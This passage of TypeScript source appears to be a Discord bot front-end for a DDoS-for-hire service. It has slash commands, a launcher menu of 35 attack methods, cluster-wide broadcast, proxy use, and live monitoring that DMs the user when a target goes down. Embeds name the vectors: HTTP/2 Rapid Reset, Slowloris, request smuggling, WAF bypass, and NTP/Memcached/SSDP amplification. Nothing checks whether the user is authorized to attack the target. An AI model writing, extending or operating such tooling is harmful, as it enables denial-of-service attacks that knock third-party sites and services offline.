  // MAX 5 concurrent monitors — prevents Discord request queue saturation that causes
  // "The application did not respond" errors on unrelated commands (e.g. /lelouch ask)
  if (monitors.size >= 5) {
    console.warn(`[MONITOR] Max concurrent monitors (5) reached — skipping monitor for #${attackId}`);
    return;
  }

  const INTERVAL_MS     = 8_000; // 8s — live metrics update frequency (reduced to prevent Discord REST queue saturation)
  const MAX_LIFETIME_MS = 70 * 60 * 1000; // 70 min — force-kill monitor after max attack duration
  const startedAt       = Date.now();

  // PPS history for trend arrows (↑↓→) — last 6 samples = 30s of trend data
  const ppsHistory: number[] = [];

  // Proxy count fetched once at monitor start — used in embed badge
  let proxyCount = 0;
  void api.getProxyStats().then(s => { proxyCount = s?.count ?? 0; }).catch(() => {});

  targetHistories.set(attackId, []);
  downAlertSent.set(attackId, false);
  let busy = false;
  let nullConsecutive = 0; // consecutive null responses

  const stopMonitor = () => {
    clearInterval(tick);
    monitors.delete(attackId);
    prevPackets.delete(attackId);
    targetHistories.delete(attackId);
    downAlertSent.delete(attackId);
  };

  const tick = setInterval(async () => {
    if (busy) return;
    busy = true;
    try {
      // Force-kill stale monitors that outlive the longest possible attack
      if (Date.now() - startedAt > MAX_LIFETIME_MS) {
        console.log(`[MONITOR #${attackId}] Max lifetime reached — stopping.`);
        stopMonitor();
        return;
      }

      const [attack, live, probe] = await Promise.all([
        api.getAttack(attackId),
        api.getLiveConns(attackId),
        probeTarget(target).catch(() => ({ up: true, latencyMs: 5500, reason: "Probe inconclusive — outbound network under load" } as ProbeResult)),
      ]);

      // Stop if: 5 consecutive nulls (API truly unavailable — transient timeouts are normal under load)
      if (!attack) {
        nullConsecutive++;
        if (nullConsecutive >= 5) {
          console.log(`[MONITOR #${attackId}] Stopping — nullConsec=${nullConsecutive}`);
          stopMonitor();
        }
        return;
      }
      nullConsecutive = 0; // reset on success

      const history = targetHistories.get(attackId) ?? [];
      history.push(probe);
      if (history.length > 30) history.shift();
      targetHistories.set(attackId, history);

      // Use in-memory live pps from the /live endpoint (no DB lag)
      // Fallback to delta calculation if live.pps is unavailable
      const livePps = live.pps > 0
        ? live.pps
        : (() => {
            const prev  = prevPackets.get(attackId) ?? attack.packetsSent;
            const delta = Math.max(0, attack.packetsSent - prev);
            prevPackets.set(attackId, attack.packetsSent);
            return Math.round(delta / (INTERVAL_MS / 1000));
          })();
      if (live.pps > 0) prevPackets.set(attackId, attack.packetsSent);

      // Track PPS history for trend arrows — keep last 6 samples (30s window)
      ppsHistory.push(livePps);
      if (ppsHistory.length > 6) ppsHistory.shift();

      const liveBps   = live.bps ?? 0;
      const isRunning = attack.status === "running";
      const row       = buildAttackButtons(attackId, isRunning);

      try {
        await editFn({
          embeds:     [buildAttackEmbed(attack, livePps, liveBps, live?.conns ?? 0, history, ppsHistory, proxyCount)],
          components: [row],
        });
      } catch (editErr) {
        console.warn(`[MONITOR #${attackId}] embed edit failed:`, (editErr instanceof Error) ? editErr.message : editErr);
      }

      // ── DM alert when target goes definitively DOWN ─────────────────────
      if (
        userId &&
        botClient &&
        !downAlertSent.get(attackId) &&
        !probe.up &&
        (probe.reason?.includes("refused") || probe.reason?.includes("ECONNREFUSED"))
      ) {
        downAlertSent.set(attackId, true);
        try {
          const user = await botClient.users.fetch(userId);
          await user.send({
            embeds: [
              new EmbedBuilder()
                .setColor(COLORS.RED)
                .setTitle("💀 TARGET CONFIRMED DOWN")
                .setDescription(
                  `> *"All opposition shall submit to the might of Geass."*\n\n` +
                  `**Attack #${attackId}** — \`${target}\` has gone **DOWN**.`
                )
                .addFields(
                  { name: "🎯 Target",   value: `\`${target}\``,             inline: true },
                  { name: "⚔️ Method",   value: `\`${attack.method}\``,      inline: true },
                  { name: "💀 Reason",   value: probe.reason ?? "ECONNREFUSED", inline: false },
                )
                .setFooter({ text: AUTHOR })
                .setTimestamp(),
            ],
          });
        } catch { /* DM may be blocked by user privacy settings */ }
      }

      if (!isRunning) {
        // Send finish notification to the channel where attack was launched
        if (channelId && botClient) {
          try {
            const ch = await botClient.channels.fetch(channelId);
            if (ch && ch.isTextBased() && "send" in ch) {
              await ch.send({
                content: userId ? `<@${userId}>` : undefined,
                embeds: [buildFinishEmbed(attack.id, attack.target, attack.method, attack.status, attack.packetsSent, attack.bytesSent, attack.startedAt, attack.stoppedAt)],
              });
            }
          } catch (notifyErr) {
            console.warn(`[MONITOR #${attackId}] notify failed:`, notifyErr instanceof Error ? notifyErr.message : notifyErr);
          }
        }
        stopMonitor();
      }
    } catch (monitorErr) {
      // Swallow monitor errors — API timeouts / DB flaps must NOT bubble up as
      // unhandled rejections that could saturate the event loop or crash the bot.
      console.warn(`[MONITOR #${attackId}] tick error (non-fatal):`, monitorErr instanceof Error ? monitorErr.message : monitorErr);
    } finally { busy = false; }
  }, INTERVAL_MS);
  monitors.set(attackId, tick);
}

// ── Build launcher embed with all dropdowns ────────────────────────────────────
// Discord hard-limit: 25 options per select menu, 5 rows per message.
// 35 methods split: Row1 = first 25, Row2 = remaining 10, Row3 = duration,
// Row4 = threads, Row5 = Launch/Cancel buttons.
const METHOD_OPTIONS_A = METHOD_OPTIONS.slice(0, 25); // Geass + L7 + L4 + L3
const METHOD_OPTIONS_B = METHOD_OPTIONS.slice(25);    // ARES OMNIVECT ∞

function buildLauncherComponents(_target: string) {
  // Row 1 — Methods 1-25 (Geass, L7, L4, L3)
  const methodMenuA = new StringSelectMenuBuilder()
    .setCustomId("select_method")
    .setPlaceholder("⚔️ Method — Geass / L7 / L4 / L3 (1-25)...")
    .addOptions(
      METHOD_OPTIONS_A.map(m =>
        new StringSelectMenuOptionBuilder()
          .setValue(m.value)
          .setLabel(m.label)
          .setDescription(m.description.slice(0, 100))
      )
    );

  // Row 2 — Methods 26-35 (ARES OMNIVECT advanced vectors)
  const methodMenuB = new StringSelectMenuBuilder()
    .setCustomId("select_method_2")
    .setPlaceholder("🌀 Method — ARES OMNIVECT ∞ (26-35)...")
    .addOptions(
      METHOD_OPTIONS_B.map(m =>
        new StringSelectMenuOptionBuilder()
          .setValue(m.value)
          .setLabel(m.label)
          .setDescription(m.description.slice(0, 100))
      )
    );

  // Row 3 — Duration select
  const durationMenu = new StringSelectMenuBuilder()
    .setCustomId("select_duration")
    .setPlaceholder("⏱ Duration (default: 60s)")
    .addOptions(
      DURATION_OPTIONS.map(d =>
        new StringSelectMenuOptionBuilder()
          .setValue(d.value)
          .setLabel(d.label)
          .setDescription(d.description)
      )
    );

  // Row 4 — Thread select
  const threadMenu = new StringSelectMenuBuilder()
    .setCustomId("select_threads")
    .setPlaceholder("🧵 Threads (default: 200)")
    .addOptions(
      THREAD_OPTIONS.map(t =>
        new StringSelectMenuOptionBuilder()
          .setValue(t.value)
          .setLabel(t.label)
          .setDescription(t.description)
      )
    );

  return [
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(methodMenuA),
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(methodMenuB),
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(durationMenu),
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(threadMenu),
  ];
}

function buildLauncherEmbed(target: string, session: LaunchSession, selectedMethod?: string): EmbedBuilder {
  const mInfo = selectedMethod ? METHOD_OPTIONS.find(m => m.value === selectedMethod) : null;
  return new EmbedBuilder()
    .setColor(COLORS.GOLD)
    .setTitle("⚔️ GEASS LAUNCHER — Configure Attack")
    .setDescription(
      mInfo
        ? `**${mInfo.label}** selected — configure duration & threads, then click **🚀 LAUNCH**`
        : "Select an **attack method**, then optionally change duration & threads.\nClick **🚀 LAUNCH** when ready."
    )
    .addFields(
      { name: "🎯 Target",    value: `\`${target}\``,                                     inline: false },
      { name: "⚔️ Method",   value: mInfo ? `**${mInfo.label}**` : "_not selected yet_",  inline: true  },
      { name: "⏱ Duration",  value: `**${session.duration}s**`,                           inline: true  },
      { name: "🧵 Threads",  value: `**${session.threads}**`,                             inline: true  },
      { name: "\u200b",      value: "Select method above, then press **🚀 LAUNCH**.",      inline: false },
    )
    .setFooter({ text: AUTHOR })
    .setTimestamp();
}

// ── Command Handlers ──────────────────────────────────────────────────────────
async function handleAttackStart(interaction: ChatInputCommandInteraction): Promise<void> {
  // Guard: Discord occasionally delivers the same interaction twice during reconnects.
  // Replying to an already-acknowledged interaction throws DiscordAPIError[40060].
  if (interaction.replied || interaction.deferred) return;

  const target  = interaction.options.getString("target", true);
  const userId  = interaction.user.id;

  // ── Cooldown check — 30s between launches ─────────────────────────────
  const lastLaunch = attackCooldowns.get(userId);
  if (lastLaunch) {
    const elapsed  = Date.now() - lastLaunch;
    const remaining = Math.ceil((ATTACK_COOLDOWN_MS - elapsed) / 1000);
    if (elapsed < ATTACK_COOLDOWN_MS) {
      await interaction.reply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.GOLD)
            .setTitle("⏳ GEASS RECHARGING")
            .setDescription(
              `*"Even the Geass requires a moment to focus. Patience is a weapon, not a weakness."*\n\n` +
              `You must wait **${remaining}s** before launching another assault.`
            )
            .setFooter({ text: `${AUTHOR} • Cooldown: ${ATTACK_COOLDOWN_MS / 1000}s` })
            .setTimestamp(),
        ],
        flags: MessageFlags.Ephemeral,
      });
      return;
    }
  }
  attackCooldowns.set(userId, Date.now());

  // Init session with defaults — auto-expires in 5 minutes if abandoned
  const session: LaunchSession = { target, duration: 60, threads: 200 };
  pendingSessions.set(userId, session);
  scheduleSessionExpiry(userId);

  const components = buildLauncherComponents(target);
  // Row 4 — Launch + Cancel buttons
  const buttonRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId("launch_attack")
      .setLabel("🚀 LAUNCH")
      .setStyle(ButtonStyle.Danger)
      .setDisabled(true), // disabled until method is chosen
    new ButtonBuilder()
      .setCustomId("cancel_launch")
      .setLabel("✖ Cancel")
      .setStyle(ButtonStyle.Secondary),
  );

  await interaction.reply({
    embeds: [buildLauncherEmbed(target, session)],
    components: [...components, buttonRow],
  });
}

function cleanupMonitor(id: number): void {
  const timer = monitors.get(id);
  if (timer) clearInterval(timer);
  monitors.delete(id);
  prevPackets.delete(id);
  targetHistories.delete(id);
  downAlertSent.delete(id);
}

async function handleAttackStop(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const id = interaction.options.getInteger("id", true);
  console.log(`[ATTACK STOP] ${interaction.user.tag} → #${id}`);
  try {
    const result = await api.stopAttack(id);
    const ok     = result?.ok ?? false;
    cleanupMonitor(id);
    await interaction.editReply({
      embeds: [buildStopEmbed(id, ok, "pt")],
      components: [buildLangRow("pt", "stop")],
    });
    console.log(`[ATTACK #${id}] ${ok ? "Stopped" : "Stop failed"}`);
  } catch {
    await interaction.editReply({ embeds: [buildStopEmbed(id, false, "pt")], components: [buildLangRow("pt", "stop")] });
  }
}

async function handleAttackList(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  try {
    const attacks = await api.getAttacks();
    const msg = await interaction.editReply({
      embeds: [buildListEmbed(attacks, "pt")],
      components: [buildLangRow("pt", "list")],
    });
    listCache.set(msg.id, attacks);
    setTimeout(() => listCache.delete(msg.id), 1_800_000);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("FETCH FAILED", message)] });
  }
}

interface ServerHealth {
  status: "healthy" | "warning" | "critical";
  uptimeSec: number;
  process:   { heapUsedMB: number; heapTotalMB: number; rssMB: number; pid: number };
  system:    { cpus: number; load1: number; load5: number; load15: number; loadPct: number;
               totalRamMB: number; usedRamMB: number; freeRamMB: number; ramPct: number;
               hostname: string; platform: string };
  attacks:   { active: number; totalConns: number };
}

async function handleStats(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  try {
    const r = await fetch(`${API_BASE}/api/health/live`, { signal: AbortSignal.timeout(2500) });
    if (!r.ok) {
      await interaction.editReply(`⚠ Health endpoint returned **HTTP ${r.status}** — server may be degraded.`);
      return;
    }
    const h = (await r.json()) as ServerHealth;

    const fmtUptime = (s: number): string => {
      const d = Math.floor(s / 86400);
      const hr = Math.floor((s % 86400) / 3600);
      const m  = Math.floor((s % 3600) / 60);
      const sec = s % 60;
      if (d > 0)  return `${d}d ${hr}h ${m}m`;
      if (hr > 0) return `${hr}h ${m}m ${sec}s`;
      if (m > 0)  return `${m}m ${sec}s`;
      return `${sec}s`;
    };
    const fmtBar = (pct: number): string => {
      const n = Math.min(20, Math.max(0, Math.round(pct / 5)));
      return "█".repeat(n) + "░".repeat(20 - n);
    };

    const color = h.status === "healthy"  ? COLORS.GREEN
                : h.status === "warning"  ? COLORS.GOLD
                : COLORS.RED;
    const icon  = h.status === "healthy"  ? "🟢"
                : h.status === "warning"  ? "🟡"
                : "🔴";

    const stats = await api.getStats().catch(() => null);

    const embed = new EmbedBuilder()
      .setColor(color)
      .setTitle(`${icon} LELOUCH BRITANNIA — SERVER HEALTH`)
      .setDescription(
        `**Status:** \`${h.status.toUpperCase()}\` — node \`${h.system.hostname}\`\n` +
        `**Uptime:** \`${fmtUptime(h.uptimeSec)}\``
      )
      .addFields(
        { name: `🧠 RAM ${h.system.ramPct}%`,
          value: `\`${fmtBar(h.system.ramPct)}\`\n${h.system.usedRamMB} / ${h.system.totalRamMB} MB used\nFree: \`${h.system.freeRamMB} MB\``,
          inline: false },
        { name: `⚡ CPU Load ${h.system.loadPct}%`,
          value: `\`${fmtBar(h.system.loadPct)}\`\n${h.system.cpus} cores · 1m: \`${h.system.load1.toFixed(2)}\` · 5m: \`${h.system.load5.toFixed(2)}\` · 15m: \`${h.system.load15.toFixed(2)}\``,
          inline: false },
        { name: "🟣 Process",
          value: `Heap: \`${h.process.heapUsedMB} / ${h.process.heapTotalMB} MB\`\nRSS: \`${h.process.rssMB} MB\` · PID: \`${h.process.pid}\``,
          inline: true },
        { name: "⚔️ Attacks",
          value: `Active: \`${h.attacks.active}\`\nLive Conns: \`${h.attacks.totalConns.toLocaleString("en-US")}\`${stats ? `\nTotal: \`${stats.totalAttacks}\`` : ""}`,
          inline: true },
      )
      .setFooter({ text: `${BOT_NAME} — ${AUTHOR}` })
      .setTimestamp();

    await interaction.editReply({ embeds: [embed] });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("STATS FAILED", message)] });
  }
}

async function handleAttackStats(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  try {
    const [stats, proxyStats] = await Promise.all([
      api.getStats(),
      api.getProxyStats().catch(() => undefined),
    ]);
    const msg = await interaction.editReply({
      embeds: [buildStatsEmbed(stats, proxyStats ?? undefined, "pt")],
      components: [buildLangRow("pt", "stats")],
    });
    statsCache.set(msg.id, { stats, proxyStats: proxyStats ?? undefined });
    setTimeout(() => statsCache.delete(msg.id), 1_800_000);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("STATS FAILED", message)] });
  }
}

async function handleAnalyze(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const target = interaction.options.getString("target", true);
  console.log(`[ANALYZE] ${interaction.user.tag} → ${target}`);
  await interaction.editReply({
    embeds: [
      new EmbedBuilder()
        .setColor(COLORS.GOLD)
        .setTitle("🔍 SCANNING TARGET...")
        .setDescription(`Analisando \`${target}\`\nDNS probes, HTTP fingerprinting, CDN/WAF, Origin IP discovery...`)
        .setFooter({ text: AUTHOR })
    ],
  });
  try {
    const result = await api.analyze(target);
    const msg = await interaction.editReply({
      embeds: [buildAnalyzeEmbed(result, "pt")],
      files: buildGeassFiles(),
      components: [buildLangRow("pt", "analyze")],
    });
    analyzeCache.set(msg.id, result);
    setTimeout(() => analyzeCache.delete(msg.id), 3_600_000); // 1h TTL
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("ANALYSIS FAILED", message)] });
  }
}

async function handleMethods(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const layerFilter = interaction.options.getString("layer") ?? undefined;
  try {
    const methods   = await api.getMethods();
    const lang: "en" | "pt" = "pt";
    const page      = 1;
    const filtered  = layerFilter
      ? methods.filter(m => m.layer?.toLowerCase() === layerFilter.toLowerCase())
      : methods;
    const total     = Math.ceil(filtered.length / METHODS_PAGE_SIZE);
    const embed     = buildMethodsEmbed(methods, layerFilter, lang, page);
    const navRow    = buildMethodsNavRow(page, total, lang);
    const msg       = await interaction.editReply({ embeds: [embed], components: [navRow] });
    methodsCache.set(msg.id, { methods, layer: layerFilter, page, lang });
    setTimeout(() => methodsCache.delete(msg.id), 3_600_000);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("METHODS FAILED", message)] });
  }
}

// buildInfoLangRow replaced by buildLangRow("en"|"pt", "info") from embeds.ts

async function fetchInfoData() {
  const [stats, clusterStatus] = await Promise.allSettled([
    api.getStats(),
    api.getClusterStatus(),
  ]);
  const s = stats.status === "fulfilled" ? stats.value : null;
  const c = clusterStatus.status === "fulfilled" ? clusterStatus.value : null;
  return {
    guildCount:    botClient?.guilds.cache.size ?? 0,
    totalAttacks:  s?.totalAttacks   ?? 0,
    activeAttacks: s?.runningAttacks ?? 0,
    uptimeMs:      botClient?.uptime ?? 0,
    cpuCount:      s?.cpuCount,
    totalPackets:  s?.totalPacketsSent ?? 0,
    totalBytes:    s?.totalBytesSent   ?? 0,
    clusterNodes:  c?.configuredNodes  ?? 0,
  };
}

async function handleInfo(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  try {
    const data  = await fetchInfoData();
    const embed = buildInfoEmbed({ ...data, lang: "en" });
    const row   = buildLangRow("en", "info");
    await interaction.editReply({ embeds: [embed], files: buildAttackFiles(), components: [row] });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("INFO FAILED", message)] });
  }
}

async function handleHelp(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.reply({
    embeds: [buildHelpEmbed("en")],
    files: buildGeassFiles(),
    components: [buildLangRow("en", "help")],
  });
}

async function handleCluster(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub = interaction.options.getSubcommand();

  if (sub === "status") {
    await interaction.deferReply();
    try {
      const status = await api.getClusterStatus();
      await interaction.editReply({
        embeds: [buildClusterEmbed(status, "en")],
        files: buildGeassFiles(),
        components: [buildLangRow("en", "cluster")],
      });
      // Store status for lang toggle re-render
      const msgId = (await interaction.fetchReply()).id;
      (interaction.client as unknown as Record<string, unknown>)[`cluster_status_${msgId}`] = status;
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("CLUSTER STATUS FAILED", message)] });
    }
    return;
  }

  if (sub === "broadcast") {
    const target   = interaction.options.getString("target", true);
    const duration = interaction.options.getInteger("duration") ?? 60;
    const threads  = interaction.options.getInteger("threads")  ?? 200;
    const isHttps  = /^https:/i.test(target);
    const port     = isHttps ? 443 : 80;

    await interaction.deferReply();

    // Show loading state
    await interaction.editReply({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.CRIMSON)
          .setTitle("👁️ CLUSTER BROADCAST — GEASS OVERRIDE FIRING...")
          .setDescription(
            `> *"By the power of Geass, I command ALL nodes — submit to my absolute authority!"*\n\n` +
            `🌐 Broadcasting **ARES OMNIVECT ∞** to **all cluster nodes** — 33 vectors × 10 machines`
          )
          .addFields(
            { name: "🎯 Target",  value: `\`${target}\``,        inline: true },
            { name: "⏱ Duration", value: `**${duration}s**`,     inline: true },
            { name: "🧵 Threads", value: `**${threads}** / node`, inline: true },
          )
          .setFooter({ text: AUTHOR })
          .setTimestamp(),
      ],
    });

    try {
      // Fire the primary node — fan-out to all peers happens automatically server-side
      const attack  = await api.startAttack({ target, method: "geass-override", threads, duration, port });
      const clusterStatus = await api.getClusterStatus().catch(() => null);
      const nodesOnline   = clusterStatus?.totalOnline ?? 1;
      const row           = buildAttackButtons(attack.id, true);

      console.log(`[CLUSTER BROADCAST] ${interaction.user.tag} → ${target} | ${nodesOnline} nodes | ${threads}t | ${duration}s`);

      const _clusterMsg = await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.CRIMSON)
            .setTitle(`👁️ CLUSTER BROADCAST ACTIVE — ${nodesOnline} NODES FIRING`)
            .setDescription(
              `👁️ **ARES OMNIVECT ∞ × ${nodesOnline}** — All cluster nodes running 33 simultaneous attack vectors\n\n` +
              `Primary attack **#${attack.id}** monitoring below. Peer nodes fire independently.`
            )
            .setImage("attachment://lelouch.gif")
            .setThumbnail("attachment://geass-symbol.png")
            .addFields(
              { name: "🎯 Target",         value: `\`${target}\``,           inline: true },
              { name: "⏱ Duration",        value: `**${duration}s**`,        inline: true },
              { name: "🧵 Threads/Node",   value: `**${threads}**`,          inline: true },
              { name: "🌐 Nodes Online",   value: `**${nodesOnline}**`,      inline: true },
              { name: "⚡ Total Vectors",  value: `**${nodesOnline * 30}** simultaneous`, inline: true },
              { name: "📊 Status",         value: "🔴 **ALL NODES INITIALIZING...**", inline: true },
            )
            .setFooter({ text: AUTHOR })
            .setTimestamp(),
        ],
        components: [row],
        files: buildAttackFiles(),
      });

      const userId = interaction.user.id;
      startMonitor(attack.id, (opts) => interaction.editReply(opts), target, userId, interaction.channelId);
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("BROADCAST FAILED", message)] });
    }
    return;
  }
}

async function handleGeass(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const target   = interaction.options.getString("target", true);
  const duration = interaction.options.getInteger("duration") ?? 60;
  const threads  = interaction.options.getInteger("threads")  ?? 200;
  const isHttps  = /^https:/i.test(target);
  const port     = isHttps ? 443 : 80;
  console.log(`[GEASS] ${interaction.user.tag} → ${target} | ${threads}t | ${duration}s`);

  await interaction.editReply({
    embeds: [
      new EmbedBuilder()
        .setColor(COLORS.CRIMSON)
        .setTitle("👁️ LELOUCH vi BRITANNIA COMMANDS YOU...")
        .setDescription(
          `> *"I, Lelouch vi Britannia, hereby command all opposition... TO SUBMIT!"*\n\n` +
          `👁️ **GEASS OVERRIDE ∞ — ARES OMNIVECT ∞** — **30** simultaneous real attack vectors against \`${target}\`\n\n` +
          `**L7 App (12):** ConnFlood → Slowloris → H2RST(CVE-2023) → H2CONT(CVE-2024) → HPACK Bomb → WAF Bypass → WebSocket → GraphQL → RUDY v2 → Cache Poison → HTTP Bypass → Keepalive Exhaust\n` +
          `**L7 H2 (4):** H2 Storm → HTTP Pipeline(300K/s) → H2 PING Storm → HTTP Smuggling\n` +
          `**TLS (3):** TLS Renego → SSL Death → QUIC/H3\n` +
          `**Extended App (3):** XML Bomb → Slow Read → Range Flood\n` +
          `**L4 (1):** SYN Flood · **L3 (5):** ICMP → DNS → NTP → Memcached → SSDP · **UDP (2):** UDP Flood → DoH Flood`
        )
        .addFields(
          { name: "🎯 Target",   value: `\`${target}\``,        inline: true },
          { name: "⏱ Duration",  value: `**${duration}s**`,      inline: true },
          { name: "🧵 Threads",  value: `**${threads}** (base)`, inline: true },
          { name: "📊 Status",   value: "🔴 **INITIALIZING 33 VECTORS — ARES OMNIVECT ∞ COMMAND...**", inline: false },
        )
        .setFooter({ text: AUTHOR })
        .setTimestamp()
    ],
  });

  try {
    const [attack, pStats] = await Promise.all([
      api.startAttack({ target, method: "geass-override", threads, duration, port }),
      api.getProxyStats().catch(() => undefined),
    ]);
    console.log(`[GEASS #${attack.id}] 30 Vectors online — ARES OMNIVECT ∞ → ${target}`);
    const row     = buildAttackButtons(attack.id, true);
    await interaction.editReply({ embeds: [buildStartEmbed(attack, pStats?.count ?? 0)], components: [row], files: buildAttackFiles() });
    const userId  = interaction.user.id;
    startMonitor(attack.id, (opts) => interaction.editReply(opts), target, userId);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("GEASS FAILED", message)] });
  }
}

// Per-user select-menu lock — prevents race when user selects two menus in rapid succession
const selectMenuLock = new Set<string>();

// ── Select Menu Handler ───────────────────────────────────────────────────────
async function handleSelectMenu(interaction: StringSelectMenuInteraction): Promise<void> {
  // ★ Acknowledge IMMEDIATELY — Discord invalidates the token after 3 seconds.
  // Using deferUpdate() here means we have up to 15 minutes for editReply().
  // NOT deferring is the root cause of DiscordAPIError[10062] (Unknown interaction).
  await interaction.deferUpdate();

  const userId  = interaction.user.id;
  const session = pendingSessions.get(userId);
  if (!session) return; // already deferred above — safe to return without editReply

  // Per-user lock: if a previous select menu update is still in-flight for this user,
  // just update state and skip the editReply — the in-flight one will use fresh state.
  if (selectMenuLock.has(userId)) {
    // Still update state even if we skip the visual update
    const value = interaction.values[0];
    if (interaction.customId === "select_method" || interaction.customId === "select_method_2") {
      pendingMethodMap.set(userId, value);
    } else if (interaction.customId === "select_duration") {
      session.duration = parseInt(value, 10);
      pendingSessions.set(userId, session);
    } else if (interaction.customId === "select_threads") {
      session.threads = parseInt(value, 10);
      pendingSessions.set(userId, session);
    }
    return;
  }

  selectMenuLock.add(userId);
  try {
    const value = interaction.values[0];

    if (interaction.customId === "select_method" || interaction.customId === "select_method_2") {
      pendingMethodMap.set(userId, value);
    } else if (interaction.customId === "select_duration") {
      session.duration = parseInt(value, 10);
      pendingSessions.set(userId, session);
    } else if (interaction.customId === "select_threads") {
      session.threads = parseInt(value, 10);
      pendingSessions.set(userId, session);
    }

    const currentMethod = pendingMethodMap.get(userId);

    const components = buildLauncherComponents(session.target);
    const buttonRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder()
        .setCustomId("launch_attack")
        .setLabel("🚀 LAUNCH")
        .setStyle(ButtonStyle.Danger)
        .setDisabled(!currentMethod),
      new ButtonBuilder()
        .setCustomId("cancel_launch")
        .setLabel("✖ Cancel")
        .setStyle(ButtonStyle.Secondary),
    );

    await interaction.editReply({
      embeds: [buildLauncherEmbed(session.target, session, currentMethod)],
      components: [...components, buttonRow],
    });
  } finally {
    selectMenuLock.delete(userId);
  }
}

// Track selected method separately (not in LaunchSession to keep it clean)
const pendingMethodMap = new Map<string, string>();

// ── Button Interaction Handler ────────────────────────────────────────────────
async function handleButton(interaction: import("discord.js").ButtonInteraction): Promise<void> {
  const { customId } = interaction;

  // ── Launch button ─────────────────────────────────────────────────────────
  if (customId === "launch_attack") {
    const userId  = interaction.user.id;
    const session = pendingSessions.get(userId);
    const method  = pendingMethodMap.get(userId);
    if (!session || !method) {
      await interaction.reply({ content: "❌ Session expired. Run `/attack start` again.", flags: MessageFlags.Ephemeral });
      return;
    }
    clearSession(userId);

    await interaction.deferUpdate();

    // Disable all components while launching
    await interaction.editReply({ components: [] });

    const { target, duration, threads } = session;
    const isHttps = /^https:/i.test(target);
    const port    = isHttps ? 443 : 80;

    console.log(`[ATTACK START] ${interaction.user.tag} → ${target} | ${method} | ${threads}t | ${duration}s`);

    try {
      const [attack, pStats] = await Promise.all([
        api.startAttack({ target, method, threads, duration, port }),
        api.getProxyStats().catch(() => undefined),
      ]);
      const row     = buildAttackButtons(attack.id, true);
      await interaction.editReply({ embeds: [buildStartEmbed(attack, pStats?.count ?? 0)], components: [row], files: buildAttackFiles() });
      const userId  = interaction.user.id;
      console.log(`[ATTACK #${attack.id}] Started — ${method} → ${target}`);
      startMonitor(attack.id, (opts) => interaction.editReply(opts), target, userId, interaction.channelId);
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("ATTACK FAILED", message)], components: [] });
    }
    return;
  }

  // ── Cancel button ─────────────────────────────────────────────────────────
  if (customId === "cancel_launch") {
    const userId = interaction.user.id;
    clearSession(userId);
    await interaction.update({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.GRAY)
          .setTitle("✖ Launch Cancelled")
          .setDescription("The attack was cancelled.")
          .setFooter({ text: AUTHOR }),
      ],
      components: [],
    });
    return;
  }

  // ── Stop button ───────────────────────────────────────────────────────────
  if (customId.startsWith("stop_")) {
    const id = parseInt(customId.slice(5), 10);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    try {
      const result = await api.stopAttack(id);
      const ok     = result?.ok ?? false;
      cleanupMonitor(id);
      await interaction.editReply({ embeds: [buildStopEmbed(id, ok)] });
      console.log(`[BUTTON] ${interaction.user.tag} stopped attack #${id}`);
    } catch {
      await interaction.editReply({ embeds: [buildStopEmbed(id, false)] });
    }
    return;
  }

  // ── Methods pagination ────────────────────────────────────────────────────
  if (customId === "methods_prev" || customId === "methods_next") {
    await interaction.deferUpdate();
    const msgId  = interaction.message.id;
    const cached = methodsCache.get(msgId);
    if (!cached) { await interaction.editReply({ components: [] }); return; }
    const filtered = cached.layer
      ? cached.methods.filter(m => m.layer?.toLowerCase() === cached.layer?.toLowerCase())
      : cached.methods;
    const total   = Math.ceil(filtered.length / METHODS_PAGE_SIZE);
    const newPage = customId === "methods_next"
      ? Math.min(cached.page + 1, total)
      : Math.max(cached.page - 1, 1);
    const lang    = cached.lang ?? "pt";
    const embed   = buildMethodsEmbed(cached.methods, cached.layer, lang, newPage);
    const navRow  = buildMethodsNavRow(newPage, total, lang);
    methodsCache.set(msgId, { ...cached, page: newPage });
    await interaction.editReply({ embeds: [embed], components: [navRow] });
    return;
  }

  // ── Language toggle handlers ──────────────────────────────────────────────
  const langMatch = customId.match(/^(\w+)_lang:(en|pt)$/);
  if (langMatch) {
    const prefix = langMatch[1];
